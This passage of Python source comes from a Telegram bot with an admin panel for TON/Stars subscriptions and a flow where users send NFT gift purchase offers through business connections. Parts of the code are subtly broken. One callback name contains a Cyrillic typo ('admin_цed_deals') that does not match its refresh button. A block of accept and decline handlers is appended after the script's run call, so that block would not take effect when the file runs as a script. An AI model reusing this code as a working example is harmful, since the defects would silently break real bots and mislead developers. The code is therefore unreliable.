        f"Цена: <b>{price} TON</b>\n"
        f"Срок: <b>{days} дн.</b>\n"
        f"TON-адрес: <code>{address or 'не задан'}</code>\n\n"
        "Только ваш Telegram ID имеет доступ к этой панели.",
        reply_markup=admin_keyboard(),
    )


@dp.callback_query(F.data == "admin_back")
async def admin_back(callback: CallbackQuery):
    if not admin_only(callback.from_user.id):
        await callback.answer("Доступ запрещён", show_alert=True)
        return
    await callback.message.edit_text("<b>🔧 Админ-панель</b>\n\nВыберите действие:", reply_markup=admin_keyboard())
    await callback.answer()


async def render_admin_products(message, edit=False):
    products = await get_products(active_only=False)
    lines = ["<b>Товары и цены</b>", "", "Нажми на товар для управления.", ""]
    buttons = []
    for product in products:
        status = "включён" if int(product["active"]) else "выключен"
        lines.append(
            f"<code>#{product['id']}</code> <b>{product['name']}</b> — "
            f"{format_ton(product['ton_price'])} TON / {product['stars_price']} Stars / "
            f"{product['days']} дн. — {status}"
        )
        buttons.append([InlineKeyboardButton(
            text=f"#{product['id']} {product['name'][:28]}",
            style="primary",
            callback_data=f"admin_product:{product['id']}"
        )])
    if not products:
        lines.append("Товаров нет.")
    buttons.append([InlineKeyboardButton(text="Добавить товар", style="success", callback_data="admin_product_add")])
    buttons.append([InlineKeyboardButton(text="Назад", style="primary", callback_data="admin_back")])
    markup = InlineKeyboardMarkup(inline_keyboard=buttons)
    if edit:
        await message.edit_text("\n".join(lines), reply_markup=markup)
    else:
        await message.answer("\n".join(lines), reply_markup=markup)


@dp.callback_query(F.data == "admin_products")
async def admin_products(callback: CallbackQuery):
    if not admin_only(callback.from_user.id):
        await callback.answer("Доступ запрещён", show_alert=True)
        return
    await render_admin_products(callback.message, edit=True)
    await callback.answer()


@dp.callback_query(F.data.startswith("admin_product:") )
async def admin_product_detail(callback: CallbackQuery):
    if not admin_only(callback.from_user.id):
        await callback.answer("Доступ запрещён", show_alert=True)
        return
    try:
        product_id = int(callback.data.split(":", 1)[1])
    except ValueError:
        await callback.answer("Неверный товар", show_alert=True)
        return
    product = await get_product(product_id)
    if not product:
        await callback.answer("Товар не найден", show_alert=True)
        return
    status = "включён" if int(product["active"]) else "выключен"
    text = (
        f"<b>Товар #{product['id']}</b>\n\n"
        f"Название: <b>{product['name']}</b>\n"
        f"Срок: <b>{product['days']} дн.</b>\n"
        f"Цена TON: <b>{format_ton(product['ton_price'])} TON</b>\n"
        f"Цена Stars: <b>{product['stars_price']} Stars</b>\n"
        f"Статус: <b>{status}</b>"
    )
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Изменить название", style="primary", callback_data=f"admin_product_edit_name:{product_id}")],
        [InlineKeyboardButton(text="Изменить срок", style="primary", callback_data=f"admin_product_edit_days:{product_id}")],
        [InlineKeyboardButton(text="Изменить TON", style="primary", callback_data=f"admin_product_edit_ton:{product_id}")],
        [InlineKeyboardButton(text="Изменить Stars", style="primary", callback_data=f"admin_product_edit_stars:{product_id}")],
        [InlineKeyboardButton(text=("Выключить" if int(product["active"]) else "Включить"), style="danger" if int(product["active"]) else "success", callback_data=f"admin_product_toggle:{product_id}")],
        [InlineKeyboardButton(text="Удалить товар", style="danger", callback_data=f"admin_product_delete:{product_id}")],
        [InlineKeyboardButton(text="Назад к товарам", style="primary", callback_data="admin_products")],
    ])
    await callback.message.edit_text(text, reply_markup=keyboard)
    await callback.answer()


@dp.callback_query(F.data.startswith("admin_product_edit_"))
async def admin_product_edit_prompt(callback: CallbackQuery):
    if not admin_only(callback.from_user.id):
        await callback.answer("Доступ запрещён", show_alert=True)
        return
    try:
        action, product_id_text = callback.data.rsplit(":", 1)
        product_id = int(product_id_text)
    except ValueError:
        await callback.answer("Неверный товар", show_alert=True)
        return
    product = await get_product(product_id)
    if not product:
        await callback.answer("Товар не найден", show_alert=True)
        return
    field = action.replace("admin_product_edit_", "")
    prompts = {
        "name": "Отправь новое название товара.",
        "days": "Отправь новый срок в днях, например: <code>30</code>.",
        "ton": "Отправь новую цену в TON, например: <code>1.5</code>.",
        "stars": "Отправь новую цену в Stars, например: <code>100</code>.",
    }
    if field not in prompts:
        await callback.answer("Неизвестное поле", show_alert=True)
        return
    ADMIN_STATES[callback.from_user.id] = {"state": f"product_edit_{field}", "product_id": product_id}
    await callback.message.edit_text(
        f"<b>Изменение товара #{product_id}</b>\n\n{prompts[field]}\n\n/cancel — отмена"
    )
    await callback.answer()


@dp.callback_query(F.data.startswith("admin_product_toggle:"))
async def admin_product_toggle(callback: CallbackQuery):
    if not admin_only(callback.from_user.id):
        await callback.answer("Доступ запрещён", show_alert=True)
        return
    try:
        product_id = int(callback.data.split(":", 1)[1])
    except ValueError:
        await callback.answer("Неверный товар", show_alert=True)
        return
    product = await get_product(product_id)
    if not product:
        await callback.answer("Товар не найден", show_alert=True)
        return
    new_active = 0 if int(product["active"]) else 1
    db = await db_connect()
    try:
        await db.execute("UPDATE products SET active=? WHERE id=?", (new_active, product_id))
        await db.commit()
    finally:
        await db.close()
    await callback.answer("Статус изменён")
    await admin_product_detail(callback)


@dp.callback_query(F.data.startswith("admin_product_delete:"))
async def admin_product_delete_prompt(callback: CallbackQuery):
    if not admin_only(callback.from_user.id):
        await callback.answer("Доступ запрещён", show_alert=True)
        return
    try:
        product_id = int(callback.data.split(":", 1)[1])
    except ValueError:
        await callback.answer("Неверный товар", show_alert=True)
        return
    product = await get_product(product_id)
    if not product:
        await callback.answer("Товар уже удалён", show_alert=True)
        return
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Да, удалить", style="danger", callback_data=f"admin_product_delete_yes:{product_id}")],
        [InlineKeyboardButton(text="Отмена", style="primary", callback_data=f"admin_product:{product_id}")],
    ])
    await callback.message.edit_text(
        f"<b>Удалить товар?</b>\n\n#{product_id} — {product['name']}\n"
        "Это действие нельзя отменить.",
        reply_markup=keyboard,
    )
    await callback.answer()


@dp.callback_query(F.data.startswith("admin_product_delete_yes:"))
async def admin_product_delete_yes(callback: CallbackQuery):
    if not admin_only(callback.from_user.id):
        await callback.answer("Доступ запрещён", show_alert=True)
        return
    try:
        product_id = int(callback.data.split(":", 1)[1])
    except ValueError:
        await callback.answer("Неверный товар", show_alert=True)
        return
    db = await db_connect()
    try:
        await db.execute("DELETE FROM products WHERE id=?", (product_id,))
        await db.commit()
    finally:
        await db.close()
    await callback.answer("Товар удалён")
    await render_admin_products(callback.message, edit=True)


@dp.callback_query(F.data == "admin_product_add")
async def admin_product_add(callback: CallbackQuery):
    if not admin_only(callback.from_user.id):
        await callback.answer("Доступ запрещён", show_alert=True)
        return
    ADMIN_STATES[callback.from_user.id] = "product_add_name"
    await callback.message.edit_text(
        "<b>Добавление товара</b>\n\n"
        "1/4. Отправь название товара.\n"
        "Например: <code>30 дней</code>\n\n/cancel — отмена"
    )
    await callback.answer()


@dp.callback_query(F.data == "admin_settings")
async def admin_settings(callback: CallbackQuery):
    if not admin_only(callback.from_user.id):
        await callback.answer("Доступ запрещён", show_alert=True)
        return
    price = await get_setting("subscription_price_ton", str(DEFAULT_SUBSCRIPTION_PRICE))
    days = await get_setting("subscription_days", str(DEFAULT_SUBSCRIPTION_DAYS))
    address = await get_setting("ton_address", DEFAULT_TON_ADDRESS)
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"Цена: {price} TON", callback_data="admin_set_price")],
        [InlineKeyboardButton(text=f"Срок: {days} дн.", callback_data="admin_set_days")],
        [InlineKeyboardButton(text="TON-адрес", style="primary", callback_data="admin_set_address")],
        [InlineKeyboardButton(text="Назад", style="primary", callback_data="admin_back")],
    ])
    await callback.message.edit_text(
        f"<b>⚙️ Настройки</b>\n\nЦена: <b>{price} TON</b>\nСрок: <b>{days} дн.</b>\n"
        f"Адрес: <code>{address or 'не задан'}</code>",
        reply_markup=keyboard,
    )
    await callback.answer()


@dp.callback_query(F.data.in_({"admin_set_price", "admin_set_days", "admin_set_address"}))
async def admin_setting_prompt(callback: CallbackQuery):
    if not admin_only(callback.from_user.id):
        await callback.answer("Доступ запрещён", show_alert=True)
        return
    mapping = {
        "admin_set_price": ("price", "Отправь новую цену в TON, например: <code>2.5</code>"),
        "admin_set_days": ("days", "Отправь срок подписки в днях, например: <code>30</code>"),
        "admin_set_address": ("address", "Отправь новый TON-адрес для приёма оплаты."),
    }
    state, prompt = mapping[callback.data]
    ADMIN_STATES[callback.from_user.id] = state
    await callback.message.edit_text("<b>Изменение настройки</b>\n\n" + prompt + "\n\n/cancel — отмена")
    await callback.answer()


@dp.callback_query(F.data == "admin_free_add")
async def admin_free_add(callback: CallbackQuery):
    if not admin_only(callback.from_user.id):
        await callback.answer("Доступ запрещён", show_alert=True)
        return
    ADMIN_STATES[callback.from_user.id] = "free_add"
    await callback.message.edit_text("<b>➕ Бесплатный доступ</b>\n\nОтправь Telegram ID пользователя, например:\n<code>123456789</code>")
    await callback.answer()


@dp.callback_query(F.data == "admin_restore_subs")
async def admin_restore_subs(callback: CallbackQuery):
    if not admin_only(callback.from_user.id):
        await callback.answer("Доступ запрещён", show_alert=True)
        return
    ADMIN_STATES[callback.from_user.id] = "restore_subs"
    await callback.message.edit_text(
        "<b>Восстановление подписок</b>\n\n"
        "Отправь Telegram ID списком — по одному в строке, пробелами или через запятую.\n\n"
        "Каждому будет восстановлен доступ на <b>30 дней</b>. Уже более поздняя активная подписка не будет сокращена.\n\n"
        "Пример:\n<code>123456789\n987654321\n555555555</code>\n\n"
        "/cancel — отмена"
    )
    await callback.answer()


@dp.callback_query(F.data == "admin_revoke")
async def admin_revoke(callback: CallbackQuery):
    if not admin_only(callback.from_user.id):
        await callback.answer("Доступ запрещён", show_alert=True)
        return
    ADMIN_STATES[callback.from_user.id] = "revoke"
    await callback.message.edit_text("<b>Забрать доступ</b>\n\nОтправь Telegram ID. Будет удалён и платный, и бесплатный доступ.")
    await callback.answer()


@dp.callback_query(F.data == "admin_free_list")
async def admin_free_list(callback: CallbackQuery):
    if not admin_only(callback.from_user.id):
        await callback.answer("Доступ запрещён", show_alert=True)
        return
    db = await db_connect()
    try:
        cur = await db.execute("SELECT user_id FROM free_access ORDER BY user_id")
        rows = await cur.fetchall()
    finally:
        await db.close()
    text = "<b>Бесплатный доступ</b>\n\n" + ("\n".join(f"• <code>{r['user_id']}</code>" for r in rows) or "Список пуст")
    await callback.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Назад", style="primary", callback_data="admin_back")]]))
    await callback.answer()


@dp.callback_query(F.data == "admin_payments")
async def admin_payments(callback: CallbackQuery):
    if not admin_only(callback.from_user.id):
        await callback.answer("Доступ запрещён", show_alert=True)
        return
    db = await db_connect()
    try:
        cur = await db.execute("SELECT status, COUNT(*) c FROM payments GROUP BY status")
        rows = await cur.fetchall()
    finally:
        await db.close()
    stats = {r["status"]: r["c"] for r in rows}
    await callback.message.edit_text(
        "<b>Платежи</b>\n\n"
        f"Ожидают: <b>{stats.get('pending', 0)}</b>\n"
        f"Оплачено: <b>{stats.get('paid', 0)}</b>\n"
        f"Истекло: <b>{stats.get('expired', 0)}</b>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Назад", style="primary", callback_data="admin_back")]]),
    )
    await callback.answer()


@dp.callback_query(F.data == "admin_цed_deals")
async def admin_accepted_deals(callback: CallbackQuery):
    if not admin_only(callback.from_user.id):
        await callback.answer("Доступ запрещён", show_alert=True)
        return

    db = await db_connect()
    try:
        cur = await db.execute(
            "SELECT * FROM accepted_deals ORDER BY accepted_at DESC LIMIT 30"
        )
        rows = await cur.fetchall()
    finally:
        await db.close()

    lines = ["<b>🤝 Принятые сделки</b>", ""]
    if not rows:
        lines.append("Принятых сделок пока нет.")
    else:
        for row in rows:
            dt = time.strftime("%d.%m.%Y %H:%M", time.localtime(int(row["accepted_at"])))
            currency = "Stars" if row["currency"] == "stars" else "GRAM"
            buyer = row["buyer"] or "не указан"
            lines.extend([
                f"<b>#{row['order_id']}</b>",
                f"Подарок: <a href=\"{row['nft_url']}\">{row['nft_name']} #{row['nft_number']}</a>",
                f"Сумма: <b>{row['amount']} {currency}</b>",
                f"Покупатель: {buyer}",
                f"Принята: {dt}",
                "────────────",
            ])

    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Обновить", style="primary", callback_data="admin_accepted_deals")],
        [InlineKeyboardButton(text="Назад", style="primary", callback_data="admin_back")],
    ])
    await callback.message.edit_text(
        "\n".join(lines),
        reply_markup=keyboard,
        disable_web_page_preview=True,
    )
    await callback.answer()


@dp.callback_query(F.data == "admin_broadcast")
async def admin_broadcast(callback: CallbackQuery):
    if not admin_only(callback.from_user.id):
        await callback.answer("Доступ запрещён", show_alert=True)
        return
    ADMIN_STATES[callback.from_user.id] = "broadcast"
    await callback.message.edit_text(
        "<b>📢 Рассылка внутренним пользователям</b>\n\n"
        "Отправь текст сообщения. Оно будет отправлено пользователям, которые уже взаимодействовали с ботом и сейчас имеют активный доступ.\n\n"
        "Поддерживается HTML.\n"
        "/cancel — отмена"
    )
    await callback.answer()


@dp.callback_query(F.data == "admin_stats")
async def admin_stats(callback: CallbackQuery):
    if not admin_only(callback.from_user.id):
        await callback.answer("Доступ запрещён", show_alert=True)
        return
    now = int(time.time())
    db = await db_connect()
    try:
        cur = await db.execute("SELECT COUNT(*) c FROM free_access")
        free_count = (await cur.fetchone())["c"]
        cur = await db.execute("SELECT COUNT(*) c FROM subscriptions WHERE expires_at > ?", (now,))
        active_count = (await cur.fetchone())["c"]
        cur = await db.execute("SELECT COUNT(*) c FROM payments WHERE status='paid'")
        paid_count = (await cur.fetchone())["c"]
        cur = await db.execute("SELECT COUNT(*) c FROM internal_users")
        internal_count = (await cur.fetchone())["c"]
    finally:
        await db.close()
    await callback.message.edit_text(
        "<b>Статистика</b>\n\n"
        f"Активных подписок: <b>{active_count}</b>\n"
        f"Бесплатных доступов: <b>{free_count}</b>\n"
        f"Успешных платежей: <b>{paid_count}</b>\n"
        f"Внутренних пользователей: <b>{internal_count}</b>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Назад", style="primary", callback_data="admin_back")]]),
    )
    await callback.answer()


@dp.message(F.from_user.id != ADMIN_ID)
async def user_state_input(message: Message):
    if message.from_user.id == ADMIN_ID:
        return
    state = USER_STATES.get(message.from_user.id)
    if not state or not message.text:
        return
    value = message.text.strip()
    try:
        if state["state"] == "create_nft":
            nft = parse_nft(value)
            if not nft:
                await message.answer("Неверная ссылка. Отправьте ссылку вида https://t.me/nft/Collection-123")
                return
            state.update({"state":"create_price", "nft":nft})
            await message.answer("Отправьте цену, например: 150")
            return
        if state["state"] == "create_price":
            amount = float(value.replace(",", "."))
            if amount <= 0:
                raise ValueError
            state.update({"state":"create_currency", "amount":str(int(amount)) if amount.is_integer() else str(amount)})
            await message.answer("Выберите валюту.", reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="Stars", style="primary", callback_data="create_currency:stars"), InlineKeyboardButton(text="GRAM", style="primary", callback_data="create_currency:gram")]
            ]))
            return
        if state["state"] == "create_language":
            return
    except ValueError:
        await message.answer("Неверное значение. Попробуйте ещё раз.")


@dp.callback_query(F.data.startswith("create_currency:"))
async def create_currency_callback(callback: CallbackQuery):
    state = USER_STATES.get(callback.from_user.id)
    if not state:
        await callback.answer("Сессия создания оффера истекла", show_alert=True)
        return
    state["currency"] = callback.data.split(":",1)[1]
    state["state"] = "create_language"
    await callback.message.edit_text("Выберите язык оффера.", reply_markup=InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Русский", style="primary", callback_data="create_language:ru"), InlineKeyboardButton(text="English", style="primary", callback_data="create_language:en")],
        [InlineKeyboardButton(text="العربية", style="primary", callback_data="create_language:ar")],
    ]))
    await callback.answer()


@dp.callback_query(F.data.startswith("create_language:"))
async def create_language_callback(callback: CallbackQuery):
    state = USER_STATES.get(callback.from_user.id)
    if not state:
        await callback.answer("Сессия создания оффера истекла", show_alert=True)
        return
    state["language"] = callback.data.split(":",1)[1]
    state = USER_STATES.pop(callback.from_user.id, None)
    data = {
        "nft": state["nft"], "amount": state["amount"], "currency": state["currency"],
        "language": state["language"], "timer_hours": 0, "buyer": None,
    }
    try:
        order_id = await send_business_offer(data, callback.from_user.id, state["connection_id"], state["chat_id"])
        await callback.message.edit_text(
            f"<b>Оффер {order_id} создан.</b>",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="Мои офферы", style="primary", callback_data="user_offers")],
                [InlineKeyboardButton(text="В панель", style="primary", callback_data="user_panel")],
            ])
        )
        await callback.answer("Оффер отправлен")
    except Exception as error:
        await callback.message.edit_text(f"<b>Не удалось создать оффер.</b>\n\n{str(error)[:500]}", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="В панель", style="primary", callback_data="user_panel")]]))
        await callback.answer()


@dp.message(F.text == "/cancel")
async def admin_cancel(message: Message):
    if admin_only(message.from_user.id):
        ADMIN_STATES.pop(message.from_user.id, None)
        await message.answer("Отменено. /admin — открыть панель.")
        return
    if message.from_user.id in USER_STATES:
        USER_STATES.pop(message.from_user.id, None)
        await message.answer("Создание оффера отменено.")


@dp.message()
async def admin_state_input(message: Message):
    if not admin_only(message.from_user.id):
        return
    state = ADMIN_STATES.get(message.from_user.id)
    if not state or not message.text:
        return
    value = message.text.strip()
    try:
        if state == "product_add_name":
            ADMIN_STATES[message.from_user.id] = {"state": "product_add_days", "name": value}
            await message.answer("<b>2/4.</b> Отправь срок в днях, например: <code>30</code>")
            return
        if isinstance(state, dict) and state.get("state") == "product_add_days":
            days = int(value)
            if days <= 0 or days > 3650:
                raise ValueError
            ADMIN_STATES[message.from_user.id] = {"state": "product_add_ton", "name": state["name"], "days": days}
            await message.answer("<b>3/4.</b> Отправь цену в TON, например: <code>1.5</code>")
            return
        if isinstance(state, dict) and state.get("state") == "product_add_ton":
            ton = Decimal(value.replace(",", "."))
            if ton <= 0:
                raise ValueError
            ADMIN_STATES[message.from_user.id] = {"state": "product_add_stars", "name": state["name"], "days": state["days"], "ton": str(ton)}
            await message.answer("<b>4/4.</b> Отправь цену в Stars, например: <code>100</code>")
            return
        if isinstance(state, dict) and state.get("state", "").startswith("product_edit_"):
            product_id = int(state["product_id"])
            field = state["state"].replace("product_edit_", "")
            product = await get_product(product_id)
            if not product:
                ADMIN_STATES.pop(message.from_user.id, None)
                await message.answer("Товар не найден.")
                return
            db = await db_connect()
            try:
                if field == "name":
                    if not value or len(value) > 100:
                        raise ValueError
                    await db.execute("UPDATE products SET name=? WHERE id=?", (value, product_id))
                elif field == "days":
                    days = int(value)
                    if days <= 0 or days > 3650:
                        raise ValueError
                    await db.execute("UPDATE products SET days=? WHERE id=?", (days, product_id))
                elif field == "ton":
                    ton = Decimal(value.replace(",", "."))
                    if ton <= 0:
                        raise ValueError
                    await db.execute("UPDATE products SET ton_price=? WHERE id=?", (str(ton), product_id))
                elif field == "stars":
                    stars = int(value)
                    if stars <= 0:
                        raise ValueError
                    await db.execute("UPDATE products SET stars_price=? WHERE id=?", (stars, product_id))
                else:
                    raise ValueError
                await db.commit()
            finally:
                await db.close()
            ADMIN_STATES.pop(message.from_user.id, None)
            await message.answer(f"Товар #{product_id} обновлён.\n\n/admin → Товары и цены")
            return

        if isinstance(state, dict) and state.get("state") == "product_add_stars":
            stars = int(value)
            if stars <= 0:
                raise ValueError
            db = await db_connect()
            try:
                await db.execute(
                    "INSERT INTO products(name,days,ton_price,stars_price,active,created_at) VALUES(?,?,?,?,1,?)",
                    (state["name"][:100], int(state["days"]), state["ton"], stars, int(time.time())),
                )
                await db.commit()
            finally:
                await db.close()
            ADMIN_STATES.pop(message.from_user.id, None)
            await message.answer(f"✅ Товар <b>{state['name']}</b> добавлен. TON: <b>{state['ton']}</b>, Stars: <b>{stars}</b>, срок: <b>{state['days']} дн.</b>\n\n/admin → Товары и цены")
            return
        if state == "broadcast":
            ADMIN_STATES.pop(message.from_user.id, None)
            db = await db_connect()
            try:
                cur = await db.execute("SELECT user_id FROM internal_users ORDER BY user_id")
                rows = await cur.fetchall()
            finally:
                await db.close()

            sent_count = 0
            failed_count = 0
            for row in rows:
                uid = int(row["user_id"])
                if uid == ADMIN_ID or not await has_access(uid):
                    continue
                try:
                    await bot.send_message(uid, value, parse_mode=ParseMode.HTML)
                    sent_count += 1
                    await asyncio.sleep(0.05)
                except Exception as error:
                    failed_count += 1
                    logger.warning("BROADCAST FAILED | user=%s | %s", uid, error)
            await message.answer(
                f"<b>Рассылка завершена.</b>\n\nОтправлено: <b>{sent_count}</b>\nОшибок: <b>{failed_count}</b>"
            )
            return
        if state == "price":
            price = Decimal(value.replace(",", "."))
            if price <= 0:
                raise ValueError
            await set_setting("subscription_price_ton", format_ton(price))
            await message.answer(f"✅ Цена изменена: <b>{format_ton(price)} TON</b>")
        elif state == "days":
            days = int(value)
            if days <= 0 or days > 3650:
                raise ValueError
            await set_setting("subscription_days", days)
            await message.answer(f"✅ Срок изменён: <b>{days} дн.</b>")
        elif state == "address":
            if len(value) < 20 or " " in value:
                raise ValueError
            await set_setting("ton_address", value)
            await message.answer("✅ TON-адрес сохранён.")
        elif state == "free_add":
            user_id = int(value)
            await add_free_access(user_id)
            await message.answer(f"✅ Бесплатный доступ выдан ID <code>{user_id}</code>.")
        elif state == "restore_subs":
            raw_ids = value.replace(",", " ").replace(";", " ")
            ids = []
            for token in raw_ids.split():
                if token.startswith("+"):
                    token = token[1:]
                if not token.isdigit():
                    raise ValueError
                uid = int(token)
                if uid <= 0:
                    raise ValueError
                if uid not in ids:
                    ids.append(uid)
            if not ids:
                raise ValueError

            now = int(time.time())
            new_expiry = now + 30 * 86400
            db = await db_connect()
            try:
                restored = 0
                unchanged = 0
                for uid in ids:
                    cur = await db.execute(
                        "SELECT expires_at FROM subscriptions WHERE user_id=?", (uid,)
                    )
                    row = await cur.fetchone()
                    if row and int(row["expires_at"]) >= new_expiry:
                        unchanged += 1
                        continue
                    if row:
                        await db.execute(
                            "UPDATE subscriptions SET expires_at=?, source='restore' WHERE user_id=?",
                            (new_expiry, uid),
                        )
                    else:
                        await db.execute(
                            "INSERT INTO subscriptions(user_id, expires_at, source) VALUES(?, ?, 'restore')",
                            (uid, new_expiry),
                        )
                    restored += 1
                await db.commit()
            finally:
                await db.close()

            ADMIN_STATES.pop(message.from_user.id, None)
            await message.answer(
                "<b>Восстановление завершено.</b>\n\n"
                f"Обработано ID: <b>{len(ids)}</b>\n"
                f"Восстановлено: <b>{restored}</b>\n"
                f"Уже имели более поздний срок: <b>{unchanged}</b>\n"
                "Срок для восстановленных: <b>30 дней</b>."
            )
            return
        elif state == "revoke":
            user_id = int(value)
            await revoke_user_access(user_id)
            await message.answer(f"✅ Доступ полностью забран у ID <code>{user_id}</code>.")
        else:
            return
        ADMIN_STATES.pop(message.from_user.id, None)
    except (ValueError, InvalidOperation):
        await message.answer("❌ Неверное значение. Попробуй ещё раз или /cancel.")


async def restore_active_offers():
    """Восстанавливает активные офферы и их таймеры после перезапуска Railway."""
    db = await db_connect()
    try:
        cur = await db.execute(
            "SELECT order_id, owner_user_id, data_json, message_id, connection_id, chat_id, expires_at "
            "FROM user_offers WHERE status='active'"
        )
        rows = await cur.fetchall()
    finally:
        await db.close()

    now = int(time.time())
    restored = 0
    for row in rows:
        order_id = row["order_id"]
        try:
            data = json.loads(row["data_json"])
            expires_at = int(row["expires_at"])
            connection_id = row["connection_id"]
            chat_id = int(row["chat_id"])
            message_id = int(row["message_id"])
            owner_id = int(row["owner_user_id"])
            data["order_id"] = order_id
            data["owner_user_id"] = owner_id
            data["expires_at"] = expires_at

            # Таймер является только отображением и не блокирует принятие оффера.
            # Не переводим оффер в expired при перезапуске — кнопки остаются рабочими.
            if not connection_id or not chat_id or not message_id:
                logger.warning("ACTIVE OFFER HAS INCOMPLETE MESSAGE DATA | order=%s", order_id)
                continue

            OFFERS[order_id] = dict(data)
            OFFERS[order_id]["expires_at"] = expires_at
            OFFERS[order_id]["message_id"] = message_id
            OFFERS[order_id]["connection_id"] = connection_id
            OFFERS[order_id]["chat_id"] = chat_id
            restored += 1
        except Exception as error:
            logger.exception("FAILED TO RESTORE OFFER | order=%s | %s", order_id, error)
    logger.info("ACTIVE OFFERS RESTORED | count=%s", restored)


# ============================================================
# KEEPALIVE
# ============================================================

async def keepalive():
    while True:
        await asyncio.sleep(KEEPALIVE_SECONDS)
        try:
            await bot.get_me()
        except Exception:
            pass


# ============================================================
# START
# ============================================================

async def main():
    bot_info = await bot.get_me()

    logger.info("========================================")
    logger.info("BOT STARTED")
    logger.info("Username: @%s", bot_info.username)
    logger.info("ID: %s", bot_info.id)
    logger.info("========================================")

    await init_db()
    await restore_active_offers()

    await bot.delete_webhook(drop_pending_updates=True)
    asyncio.create_task(keepalive())
    asyncio.create_task(payment_watcher())

    await dp.start_polling(
        bot,
        allowed_updates=[
            "message",
            "business_message",
            "business_connection",
            "callback_query",
            "pre_checkout_query",
        ],
    )


# ============================================================
# RUN
# ============================================================

if __name__ == "__main__":
    asyncio.run(main())
# ============================================================
# ИСПРАВЛЕНИЯ ДЛЯ КНОПОК ПРИНЯТЬ / ОТКЛОНИТЬ
# ============================================================

def offer_data_from_callback(callback, language, order_id):
    message = callback.message
    text = message.text or message.caption or ""
    entities = message.entities or message.caption_entities or []
    clean_text = re.sub(r'<[^>]+>', '', text)

    nft_url = None
    for entity in entities:
        if getattr(entity, "type", None) == "text_link" and getattr(entity, "url", None):
            nft_url = entity.url
            break
    if not nft_url:
        preview = getattr(message, "link_preview_options", None)
        nft_url = getattr(preview, "url", None) if preview else None
    if not nft_url:
        match = re.search(r"https?://t\.me/nft/[A-Za-z0-9_-]+", text)
        nft_url = match.group(0) if match else None

    nft = parse_nft(nft_url) if nft_url else None
    if not nft:
        return None

    amount_match = re.search(
        r"(?<!\w)(\d+(?:[.,]\d+)?)\s*(⭐️?|stars?|зв[её]зд\w*|gram|грам\w*|ستارز|星)?",
        clean_text,
        re.IGNORECASE,
    )
    if not amount_match:
        return None
    amount = amount_match.group(1).replace(",", ".")
    unit = (amount_match.group(2) or "").lower()

    if unit.startswith("gram") or unit.startswith("грам") or unit.startswith("غرام"):
        currency = "gram"
    elif unit:
        currency = "stars"
    else:
        currency = "gram" if re.search(r"(?<![a-z])gram(?![a-z])|грам\w*|غرام|💎", clean_text, re.IGNORECASE) else "stars"

    return {
        "nft": nft,
        "amount": amount,
        "currency": currency,
        "language": language,
        "timer_hours": OFFER_DURATION_HOURS,
        "buyer": OFFERS.get(order_id, {}).get("buyer") or DEFAULT_BUYER,
        "order_id": order_id,
        "accepted_at": time.time(),
    }

def create_accept_keyboard(data):
    buyer = str(data.get("buyer") or "").lstrip("@")
    if buyer.isdigit():
        url = f"tg://user?id={buyer}"
    else:
        url = "https://t.me/" + buyer

    return InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(
            text="Профиль покупателя",
            url=url
        )
    ]])

async def edit_original_offer_message(callback: CallbackQuery, text: str, reply_markup=None, link_preview_options=None):
    try:
        if callback.message.business_connection_id:
            return await callback.bot(
                EditMessageText(
                    business_connection_id=callback.message.business_connection_id,
                    chat_id=callback.message.chat.id,
                    message_id=callback.message.message_id,
                    text=text,
                    parse_mode=ParseMode.HTML,
                    reply_markup=reply_markup,
                    link_preview_options=link_preview_options,
                )
            )
        return await callback.message.edit_text(
            text,
            parse_mode=ParseMode.HTML,
            reply_markup=reply_markup,
            link_preview_options=link_preview_options,
        )
    except Exception as e:
        logger.error("EDIT MESSAGE ERROR: %s", e)
        raise e

@dp.callback_query(F.data.startswith("offer_decline"))
async def decline_offer(callback: CallbackQuery):
    language = language_from_callback(callback.data)
    lang = TEXTS[language]
    order_id = order_id_from_callback(callback.data)
    try:
        await edit_original_offer_message(callback, lang["cancelled"])
        await callback.answer()
        if order_id:
            await update_user_offer_status(order_id, "declined")
    except Exception as error:
        logger.exception("DECLINE ERROR | order=%s | %s", order_id, error)
        try:
            await callback.answer(f"Не удалось изменить сообщение: {str(error)[:180]}", show_alert=True)
        except Exception:
            pass

@dp.callback_query(F.data.startswith("offer_accept"))
async def accept_offer(callback: CallbackQuery):
    language = language_from_callback(callback.data)
    order_id = order_id_from_callback(callback.data)
    
    data = OFFERS.get(order_id)
    if not data:
        row = await get_user_offer(order_id)
        if row:
            data = json.loads(row["data_json"])
            data["order_id"] = order_id
            OFFERS[order_id] = data
            
    if not data:
        data = offer_data_from_callback(callback, language, order_id)
        
    if data is None:
        await callback.answer("Не удалось прочитать данные оффера.", show_alert=True)
        return
        
    await callback.answer("Проверьте личность покупателя и подтверждение оплаты до передачи NFT.", show_alert=True)
    
    try:
        await edit_original_offer_message(
            callback,
            text=create_accept_text(data),
            reply_markup=create_accept_keyboard(data),
            link_preview_options=LinkPreviewOptions(is_disabled=True),
        )
        if order_id:
            await update_user_offer_status(order_id, "accepted")
    except Exception as error:
        logger.exception("OFFER ACCEPT EDIT FAILED | order=%s | %s", order_id, error)